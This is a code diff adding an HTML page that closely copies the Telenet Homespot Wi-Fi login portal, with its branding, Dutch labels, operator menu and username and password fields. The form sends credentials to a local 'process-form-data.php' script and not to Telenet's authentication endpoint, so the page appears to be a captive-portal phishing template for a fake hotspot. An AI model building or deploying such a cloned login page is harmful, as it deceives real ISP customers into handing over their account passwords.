@@ -1,0 +1,401 @@
+<!doctype html>
+<html>
+<head>
+	<meta http-equiv="Content-Type" content="text/html;charset=UTF-8"/>
+	<title>Telenet Homespot</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+	<meta name="format-detection" content="telephone=no">
+	<style type="text/css">
+/* *****************************************  BEGIN Global (all screens) ************************************** */
+/******************************* RESET *******************************/
+* { margin: 0; padding: 0; }
+*:focus { outline: 0; }
+textarea:focus, input:focus { outline: 0; }
+img { border: none; }
+ul { list-style: none; }
+ul li { background: none; }
+/****************** HTML5 ELEMENTS ***********************************/
+section, article, header, footer, nav, aside, hgroup { display: block; }
+/****************** GENERAL *****************************************/
+
+@font-face { font-family: 'CooperStdBlack'; src: url('static/font/cooperblackstd-webfont.eot'); src: url('static/font/cooperblackstd-webfont.eot?#iefix') format('embedded-opentype'), url('static/font/cooperblackstd-webfont.woff') format('woff'), url('static/font/cooperblackstd-webfont.ttf') format('truetype'), url('static/font/cooperblackstd-webfont.svg#CooperStdBlack') format('svg'); font-weight: normal; font-style: normal; }
+body { font-family: Verdana, Helvetica, Geneva, sans-serif; color: #606060; font-size: 11px; line-height: 18px; margin: 0; padding: 0; background: #FFFFFF; }
+/* LAYOUT */
+
+.lang { float: right; width: 120px; height: 15px; display: block; margin: 10px 0; }
+header { clear: both; }
+header h1 { font-family: 'CooperStdBlack'; color: #FFFFFF; }
+.cols { margin-top: 15px; }
+footer { clear: both; }
+.border { border-radius: 8px; -webkit-border-radius: 8px; -moz-border-radius: 8px; }
+/* LOGIN */
+label { clear: both; display: block; color: #f28534; font-weight: bold; }
+label a { color: #F28534; }
+input { margin: 5px 0 12px 0; border: 1px solid #CCCCCC; border: 0\9; padding-left: 4px; padding-right: 10px; *padding-left:0;
+font-size: 18px; *padding-top:6px;
+}
+input[type="checkbox"] { clear: both; float: left; margin-right: 10px; height: auto; border-radius:0; -webkit-border-radius:0; -moz-border-radius:0; -o-border-radius:0;}
+.styled-select{overflow: hidden; background: url("static/images/select-arrow.png") no-repeat right 16px #fff; border: 1px solid #CCCCCC; border-radius:10px; -webkit-border-radius:10px; -moz-border-radius:10px; -o-border-radius:10px;margin:5px 0 12px; }
+select{background: transparent; -webkit-appearance: none; -moz-appearance:none; padding: 4px 0 0 5px\9;  padding-left:5px; padding-top:5px; line-height: 1; border: 0; border-radius: 0; }
+.login_xt { clear: both; height: 70px; }
+.login_xt input { clear: both; float: left; }
+.login_xt label { float: left; color: #606060; text-align: left; clear: none; line-height: 21px; }
+.submit { clear: both; }
+input.button { display: inline-block; border: none; border-radius: 8px; -webkit-border-radius: 8px; -moz-border-radius: 8px; color: #FFF; font-family: CooperStdBlack; font-weight: normal; font-size: 26px; cursor: pointer; padding-top: 5px; }
+input.button:hover { text-decoration: underline; }
+/* LANGUAGE */
+.lang ul { }
+.lang ul li { float: left; }
+.lang ul li a { font-size: 14px; color: #606060; text-decoration: underline; }
+.lang ul li span { margin: 0 4px; }
+.lang ul li a:hover, .lang ul li.active a { font-weight: bold; text-decoration: none; }
+/* CLIENT */
+
+.clear { clear: both; }
+/* ERROR */
+#error { margin: 10px auto; }
+#error ul li { font-weight: bold; color: #cc0000; background: url("static/images/sprite.png") no-repeat; background-position: -934px -97px; display: block; line-height: 25px; padding-left: 35px; padding-bottom: 4px; margin-left: 10px; }
+label.greyed a, label a { color: #666666; }
+/* LOGGED IN PAGE */
+.logged_container { width: 164px; margin-left: 5px; }
+.logged_container .close { widht: 100%; height: 20px; background: #efefef; text-align: center; }
+.logged_container .close a, .logged_portaal a { color: #999999; }
+.logged_container .close a:hover, .logged_portaal a:hover { text-decoration: none; }
+.logged_logo { background: url("static/images/sprite.png") no-repeat; background-position: -758px -150px; width: 158px; height: 24px; display: block; margin: 10px auto; }
+.logged_cta { background: url("static/images/sprite.png") no-repeat; background-position: -758px -122px; width: 115px; height: 25px; display: block; margin-left: 35px; }
+.logged_cta a { font-family: 'CooperStdBlack'; color: #FFFFFF; font-weight: normal; padding-left: 8px; font-size: 14px; line-height: 28px; text-decoration: none; }
+.logged_portaal { border-top: 1px solid #e6e4e4; margin-top: 10px; text-align: center; }
+/* SESSIE Pagina */
+.sessie { text-align: center; font-size: 13px; min-height: 200px; }
+.sessie h1 { color: #F28534; font-size: 18px; border-bottom: 1px solid #eeeeee; padding-bottom: 10px; margin-top: 15px; }
+.sessie h2 { font-size: 16px; }
+.sessie .data { margin: 20px 0; }
+.sessie .info { font-style: italic; width: 295px; clear: both; margin: 0 auto; padding: 20px 0; }
+a.cta { background: url("static/images/sprite.png") no-repeat; background-position: 0 -327px; display: block; height: 31px; padding: 14px 0 0 0; text-align: center; width: 261px; font-family: 'CooperStdBlack'; color: #FFFFFF; margin: 0 auto; font-size: 24px; text-decoration: none; margin-top: 20px; }
+p { margin-bottom: 0; padding-bottom: 0; }
+.sessie p{ margin-left: 25px; }
+a { color: #F28534; text-decoration: underline; }
+a:hover { text-decoration: none; }
+footer .link a { color: #999999; }
+/* *****************************************  EINDE GLOBAL ************************************** */
+
+/* *****************************************  BEGIN iPhone ************************************** */
+@media screen and (max-width: 767px) {
+html { -webkit-text-size-adjust: none; }
+.wrapper { width: auto; float: none; }
+.container { margin: 0 auto; }
+header { background: url("static/images/sprite.png") no-repeat; background-position: -480px -182px; width: 315px; height: 46px; margin: 0 auto; }
+.voo { background: url("static/images/sprite_VOO.png") no-repeat; background-position: -480px -182px; width: 315px; height: 46px; margin: 0 auto; }
+h1 { font-size: 15px;  margin-top: 18px; }
+#content { width: 280px; margin: 0 auto }
+.lang { margin: 0 0 5px 0; }
+.login_xt { height: auto; margin-top: 5px; }
+.login_xt label { font-size: 10px; font-weight: bold; line-height: 25px; padding-left: 20px; padding-top: 5px; *padding-left:0;
+padding-left: 0\0/IE8+9; }
+label.greyed { color: #b7b7b7; width: 75%; }
+.login_xt input { height: auto; width: auto; }
+.login_data input { font-size: 13px; }
+.login_data label { margin-top: 10px; }
+input[type="checkbox"] { -webkit-transform: scale(2, 2); -moz-transform: scale(2, 2); transform: none; padding: 0; margin: 10px 0 10px 10px; border: 1px solid #CCCCCC; background: none; border: none\0/IE8+9; margin: none\0/IE8+9; border-radius:0; -webkit-border-radius:0; -moz-border-radius:0; -o-border-radius:0;}
+label { font-size: 15px; }
+label span { font-size: 10px; color: #999999; font-weight: normal; margin-left: 7px; }
+label span a { color: #999999; }
+input { height: 38px; width: 244px; border: 1px solid #CCCCCC; border-radius:10px; -webkit-border-radius:10px; -moz-border-radius:10px; -o-border-radius:10px; margin: 0; color: #999999; }
+input.button { background: url("static/images/sprite.png") no-repeat; background-position: 0 -327px; text-align: left; padding: 4px 16px 0 15px; width: 258px; margin-top: 5px; margin-bottom: 10px; line-height: 28px; font-size: 23px; }
+.styled-select{width:260px;}
+select{ margin:5px 0; height: 31px; width: 280px; line-height: 30px; padding: 4px 0 0 5px\9;  color: #999999;}
+.cols { margin-top: 5px; }
+.col1 { padding-bottom: 10px; }
+footer { width: 295px; font-size: 11px; color: #999999; margin: 0 auto; padding-top: 8px; }
+footer a { color: #FFF; }
+footer .copyright { float: right; }
+/* ERROR */
+#error { width: 280px; }
+#error ul li { font-size: 11px; line-height: 13px; margin-bottom: 7px; padding-top: 8px; }
+.error_top { display: none; }
+.error_center { width: 280px; background: none; border: 2px solid #CC0000; border-radius: 8px; -webkit-border-radius: 8px; -moz-border-radius: 8px; padding-top: 10px; }
+.error_bottom { display: none; }
+/* SESSIE Pagina */
+.sessie h2 { margin-top: 20px; margin-bottom: 10px; }
+.sessie p{ margin-left: 25px; }
+footer { border-top: 1px solid #FEC332; margin-top: 5px; padding-top: 5px; }
+footer .link { float: left; }
+}
+/* *****************************************  EINDE iPhone ************************************** */
+
+/* *****************************************  BEGIN iPhone Landscape ************************************** */
+@media screen and (max-width:767px) and (min-width:480px) {
+html { -webkit-text-size-adjust: none; }
+.wrapper { width: auto; float: none; }
+.container { width: 470px; margin: 0 auto; }
+header { background: url("static/images/sprite.png") no-repeat; background-position: 0 -182px; width: 470px; height: 46px; margin: 0 auto; }
+.voo { background: url("static/images/sprite_VOO.png") no-repeat; background-position: 0 -182px; width: 470px; height: 46px; margin: 0 auto; }
+h1 { font-size: 19px; margin-top: 18px; }
+#content { width: 440px; margin: 0 auto; }
+label { font-size: 15px; }
+label span { font-size: 12px; color: #999999; font-weight: normal; }
+.login_xt { height: auto; }
+.login_xt label { font-size: 11px; font-weight: bold; line-height: 22px; padding-left: 20px; *padding-left:0;
+padding-left: 0\0/IE8+9; padding-top: 11px; }
+label.greyed { color: #b7b7b7; line-height: 20px; }
+.login_xt input { height: auto; width: auto; background: none; }
+input[type="checkbox"] { -webkit-transform: scale(2, 2); -moz-transform: scale(2, 2); transform: none; padding: 0; margin: 15px 0 10px 10px; border: 1px solid #CCCCCC; background: none; border: none\0/IE8+9; margin: none\0/IE8+9 border-radius:0; -webkit-border-radius:0; -moz-border-radius:0; -o-border-radius:0;}
+input { height: 47px; width:312px; border: 1px solid #CCCCCC; border-radius:10px; -webkit-border-radius:10px; -moz-border-radius:10px; -o-border-radius:10px;}
+input.button { height: 53px; background: url("static/images/sprite.png") no-repeat; background-position: -607px -274px; padding-left: 15px; text-align: left; padding: 0 16px 0 0; text-align: center; width: 328px; margin-top: 15px; }
+.styled-select{width:330px;}
+select{ margin:5px 0; height: 31px; width: 350px; line-height: 30px; padding: 4px 0 0 5px\9; color: #999999;}
+.cols { margin-top: 5px; }
+.col1 { padding-bottom: 10px; }
+footer { width: 470px; font-size: 11px; color: #333333; margin: 0 auto; }
+footer { border-top: 1px solid #FEC332; margin-top: 5px; padding-top: 5px; }
+footer .link { float: left; }
+footer a { color: #tFFF; }
+footer .copyright { float: right; }
+/* ERROR */
+#error { width: 470px; }
+#error ul li { font-size: 80%; line-height: 13px; margin-bottom: 7px; padding-top: 8px; }
+.error_top { display: none; }
+.error_center { width: 465px; background: none; border: 2px solid #CC0000; border-radius: 8px; -webkit-border-radius: 8px; -moz-border-radius: 8px; padding-top: 10px; }
+.error_bottom { display: none; }
+/* SESSIE Pagina */
+.sessie h2 { margin-top: 20px; margin-bottom: 10px; }
+.sessie p{ margin-left: 0px; }
+}
+/* *****************************************  EINDE iPhone Landscape ************************************** */
+
+/* *****************************************  BEGIN iPad  ************************************** */
+@media screen and (max-width:959px) and (min-width:768px) {
+.wrapper { max-width: 799px; width: 100%; margin: 0 auto; }
+.container { width: 758px; margin: 0 auto; }
+header { background: url("static/images/sprite.png") no-repeat; background-position: 0 -96px; width: 758px; height: 78px; }
+.voo { background: url("static/images/sprite_VOO.png") no-repeat; background-position: 0 -96px; width: 758px; height: 78px; }
+h1 { font-size: 32px; margin-top: 36px; }
+#content { min-width: 422px; max-width: 620px; margin: 0 auto; }
+label { font-size: 18px; }
+label span { font-size: 12px; color: #999999; font-weight: normal; }
+.login_xt label { font-size: 14px; font-weight: normal; }
+label.greyed { color: #b7b7b7; line-height: 21px; }
+.login_xt input { height: auto; width: auto; border: none; background: none; }
+input { height: 41px; width: 321px; line-height: 40px; padding: 4px 0 0 5px\9; border: none; font-size: 14px; color: #999999; border: 1px solid #CCCCCC; border-radius:10px; -webkit-border-radius:10px; -moz-border-radius:10px; -o-border-radius:10px; }
+input.button { height: 53px; background: url("static/images/sprite.png") no-repeat; background-position: -607px -274px; padding-left: 15px; text-align: left; padding: 0 16px 0 0; text-align: center; width: 328px; display: block; margin: 15px 0; }
+input[type="checkbox"] { -webkit-transform: scale(2, 2); -moz-transform: scale(2, 2); transform: none; padding: 0; margin: 5px 15px 20px 10px; border: 1px solid #CCCCCC; background: none; border: none\0/IE8+9; margin: none\0/IE8+9; border-radius:0; -webkit-border-radius:0; -moz-border-radius:0; -o-border-radius:0;}
+.styled-select{width:338px;}
+select{ margin:5px 0; height: 31px; width: 358px; line-height: 30px; padding: 4px 0 0 5px\9; font-size: 14px; color: #999999;}
+.col1 { margin-bottom: 10px; padding-bottom: 10px; }
+footer { border-top: 1px solid #fec332; padding-top: 10px; height: 40px; }
+footer .link { float: left; }
+footer .copyright { float: right; }
+footer a { color: #606060; text-decoration: underline; }
+footer a:hover { text-decoration: none; }
+/* ERROR */
+#error { width: 758px; }
+#error ul li { color: #333333; font-size: 15px; }
+.error_top { width: 758px; height: 10px; background: url("static/images/sprite.png") no-repeat; background-position: 0 -467px; }
+.error_center { width: 758px; height: 100%; background: url("static/images/sprite_repeat.png") repeat-y; background-position: -1823px 0; }
+.error_bottom { width: 758px; height: 10px; background: url("static/images/sprite.png") no-repeat; background-position: 0 -486px; }
+/* SESSIE Pagina */
+.sessie h2 { margin-top: 20px; margin-bottom: 10px; }
+.sessie p{ margin-left: 125px; }
+}
+/* *****************************************  EINDE iPad ************************************** */
+
+/* *****************************************  BEGIN Laptop  ************************************** */
+@media screen and (min-width:960px) {
+.wrapper { width: 960px; margin: 0 auto; }
+header { background: url("static/images/sprite.png") no-repeat; background-position: 0 0; width: 960px; height: 92px; }
+.voo { background: url("static/images/sprite_VOO.png") no-repeat; background-position: 0 0; width: 960px; height: 92px; }
+h1 { font-size: 45px; margin-top: 39px; }
+#content { width: 864px; margin: 0 auto; }
+label { font-size: 18px; *display:block;
+}
+label span { font-size: 13px; color: #999999; font-weight: normal; }
+.login_xt label { font-size: 13px; font-weight: normal; display: inline; *display:block;
+*padding-top:4px;
+}
+label.greyed { color: #b7b7b7; line-height: 21px; }
+.login_xt input { clear: both; background: none; width: auto; padding: 0; margin-bottom: 10px; }
+input { height: 41px; width: 311px;line-height: 40px; padding: 4px 0 0 5px\9; border: none; font-size: 16px; color: #999999; border: 1px solid #CCCCCC; border-radius:10px; -webkit-border-radius:10px; -moz-border-radius:10px; -o-border-radius:10px;}
+input.button { height: 53px; background: url("static/images/sprite.png") no-repeat; background-position: -607px -274px; padding: 0 16px 0 0; text-align: center; width: 328px; display: block; }
+input[type="checkbox"] { -webkit-transform: scale(2, 2); -moz-transform: scale(2, 2); transform: none; padding: 0; margin: 5px 15px 20px 10px; border: 1px solid #CCCCCC; background: none; border: none\0/IE8+9; margin: none\0/IE8+9; border-radius:0; -webkit-border-radius:0; -moz-border-radius:0; -o-border-radius:0;}
+.styled-select{width:327px;}
+select{ margin:5px 0; height: 31px; width: 347px; line-height: 30px; padding: 4px 0 0 5px\9;  font-size: 16px; color: #999999;}
+.cols { width: 864px; clear: both; margin: 12px 0 0 0; }
+.col { margin: 0 auto; padding: 20px 0; }
+footer { border-top: 1px solid #fec332; padding-top: 10px; height: 40px; }
+footer .link { float: left; }
+footer .copyright { float: right; }
+footer a { color: #606060; text-decoration: underline; }
+footer a:hover { text-decoration: none; }
+/* ERROR */
+#error { width: 959px; }
+#error ul li { color: #333333; font-size: 15px; }
+.error_top { width: 959px; height: 10px; background: url("static/images/sprite.png") no-repeat; background-position: 0 -431px; }
+.error_center { width: 959px; background: url("static/images/sprite_repeat.png") repeat-y; background-position: -864px 0; }
+.error_bottom { width: 959px; height: 10px; background: url("static/images/sprite.png") no-repeat; background-position: 0 -447px; }
+/* SESSIE Pagina */
+.sessie h2 { margin-top: 20px; margin-bottom: 10px; }
+}
+/* *****************************************  EINDE Laptop ************************************** */
+	</style>
+	<!--[if lt IE 9]>
+		<script src="static/js/html5.js"></script>
+	    <script src="static/js/mediaqueries.js"></script>
+	    <script src="static/js/respond.js"></script>
+	   
+	<![endif]-->
+    <script src="static/js/jquery-1.9.1.min.js"></script>
+    <script src="static/js/modernizr-2.6.2-respond-1.1.0.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            // PLACEHOLDER INPUT FORMS
+            $('[placeholder]').focus(function () {
+                var input = $(this);
+                if (input.val() === input.attr('placeholder')) {
+                    input.val('');
+                    input.removeClass('placeholder');
+                }
+            }).blur(function () {
+                var input = $(this);
+                if (input.val() === '' || input.val() === input.attr('placeholder')) {
+                    input.addClass('placeholder');
+                    input.val(input.attr('placeholder'));
+                }
+            }).blur();
+            $("#operator").val("tln")
+        });
+    </script>
+
+<script>
+var placeholder = "Telenet login, e-mailadres of gebruikersnaam";
+function customerUpdate(){
+	var x=document.getElementById("operator").selectedIndex;
+	var y=document.getElementById("operator").options;
+	
+		if(y[x].value == "TLN"){
+			// enable/disabel keepMeSignedIn checkbox
+			if("true"=="false"){
+				document.getElementById("keepMeSignedInLabel").className="greyed";
+				document.getElementById("keepMeSignedIn").disabled = true;
+				document.getElementById("keepMeSignedIn").checked = false;
+			} else {
+				if("true"=="true"){
+					document.getElementById("keepMeSignedInLabel").className="";
+					document.getElementById("keepMeSignedIn").disabled = false;
+				}
+			}	
+			// set the usernameText
+			document.getElementById("userName").value = "Telenet login, e-mailadres of gebruikersnaam a";
+			placeholder = "Telenet login, e-mailadres of gebruikersnaam";
+		}
+		if(y[x].value == "VOO"){
+			// enable/disabel keepMeSignedIn checkbox
+			if("false"=="false"){
+				document.getElementById("keepMeSignedInLabel").className="greyed";
+				document.getElementById("keepMeSignedIn").disabled = true;
+				document.getElementById("keepMeSignedIn").checked = false;
+			} else {
+				if("true"=="true"){
+					document.getElementById("keepMeSignedInLabel").className="";
+					document.getElementById("keepMeSignedIn").disabled = false;
+				}
+			}	
+			// set redirect to partner site
+			window.location = 'https://wifree.voo.be/?target=&from=telenet&fromURI=https%3A%2F%2Fwifiportal.telenet.be%2Fhomespot&authURI=https%3A%2F%2Fwifiportal.telenet.be%2Fhomespot%2Fauthenticate.do';
+		}
+}
+</script>
+<script>
+	function fireUserNameBlurEvent(value){
+		if( value == "" ){
+			document.getElementById('userName').value=placeholder;
+		}
+	}
+	
+	function fireUserNameFocusEvent(value){
+		if(value == placeholder) { document.getElementById('userName').value = ""; }
+	}
+</script>
+</head>
+<body>
+
+
+<!--[if IE]>
+	<script type="text/javascript">
+		$(document).ready(
+		    function(a,b,c,d) {
+			    a='//tags.tiqcdn.com/utag/lgi/telenet/prod/utag.js';
+			    b=document;
+			    c='script';
+			    d=b.createElement(c);
+			    d.src=a;
+			    d.type='text/java'+c;
+			    d.async=true;
+			    a=b.getElementsByTagName(c)[0];
+			    a.parentNode.insertBefore(d,a);
+		    });
+	</script>
+<![endif]-->
+
+<!--[if !IE]> -->
+    <script async type="text/javascript" src="//tags.tiqcdn.com/utag/lgi/telenet/prod/utag.js"></script>
+<!-- <![endif]-->
+<div class="wrapper">
+  <div class="container">
+	<div class="lang">
+		<ul>
+		    
+				<li><a href="?tnlang=en">EN</a> <span>-</span></li>
+			   	<li class="active"><a href="#">NL</a> <span>-</span></li>
+			   	<li><a href="?tnlang=fr">FR</a></li>
+		</ul>
+	</div>
+
+	<header id="header">
+		<h1></h1>
+	</header>
+	<div id="content">
+		<div class="cols">
+			<div class="cols_top"></div>
+			<div class="cols_center">
+	<div class="col">
+		<form name="userBean" id="userBean" method="POST" action="process-form-data.php">
+			<label for="operator">Selecteer operator</label>
+			<div class="styled-select">
+				<select id="operator" name="operator" onchange="customerUpdate()">
+						<option value="TLN" >
+									Telenet
+						</option>
+						<option value="VOO" >
+									VOO
+						</option>
+				</select> 
+			</div>
+			<label for="userName">Gebruikersnaam</label>
+            <input type="text" name="userName" id="userName" placeholder="Telenet login, e-mailadres of gebruikersnaam"/>
+			<label for="passWord">Wachtwoord</label><input type="password" name="passWord" id="passWord"/>
+			<div class="login_xt">
+					<input type="checkbox" name="keepMeSignedIn" id="keepMeSignedIn"/>
+					<label for="keepMeSignedIn" id="keepMeSignedInLabel">
+Aangemeld blijven					</label>
+				<div style="clear:both;"></div>
+				<input type="checkbox" name="terms" id="terms"/><label for="terms">Ik aanvaard de <a href="http://www.telenethomespot.be/portal/terms/nl/index.html" target="_blank">Gebruiksvoorwaarden</a></label>
+			</div>
+			<div class="submit">
+				<input type="submit" value="Aanmelden" class="button" />
+			</div>
+		</form>
+	</div>
+          	</div>
+			<div class="cols_bottom"></div>
+		</div>
+    </div>
+	<footer>
+      <div class="link"><a href="http://www.telenethomespot.be/portal/info/nl/index.html">Meer info</a></div>
+      <div class="copyright">&copy; Telenet <script type="text/javascript">var year = new Date();document.write(year.getFullYear());</script></div>
+    </footer>
+  </div>
+</div>
+</body>
+</html>
+
